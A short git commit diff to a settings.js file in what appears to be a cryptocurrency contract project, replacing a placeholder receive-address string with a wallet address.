b7137c006c7ede00b3b5edd7cd1e6a0d244be1f4
SKYNETTTT <73568737+SKYNETTTT@users.noreply.github.com>
2024-07-25 23:02:42 -0400

    Add files via upload

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "bc1qruqq52mpn8cdfvdfzzt2u5004du2d0dfupumfj";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
